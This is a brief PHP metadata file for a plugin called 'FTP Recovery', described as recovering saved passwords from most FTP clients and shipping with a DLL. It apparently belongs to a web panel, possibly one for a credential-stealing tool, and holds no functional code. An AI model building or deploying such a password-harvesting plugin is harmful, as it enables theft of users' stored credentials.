<?php
if(!isset($initialized))
{
	include('../../pages/404.php');
}

$plugin_name = "FTP Recovery";
$plugin_guid = "7663f1f2-a059-4112-b3c8-39657c56879c"; // GUID should be different for diferent versions
$plugin_desc = "Recovers saved passwords from most FTP clients!";
$plugin_author = "RonnyRoy";
$plugin_icon = "<i class='fa fa-key'></i>"; // Font awesome icons
$plugin_version_str = "1.0.0.0";
$plugin_version_int = 1000;
$plugin_has_dll = true;
?>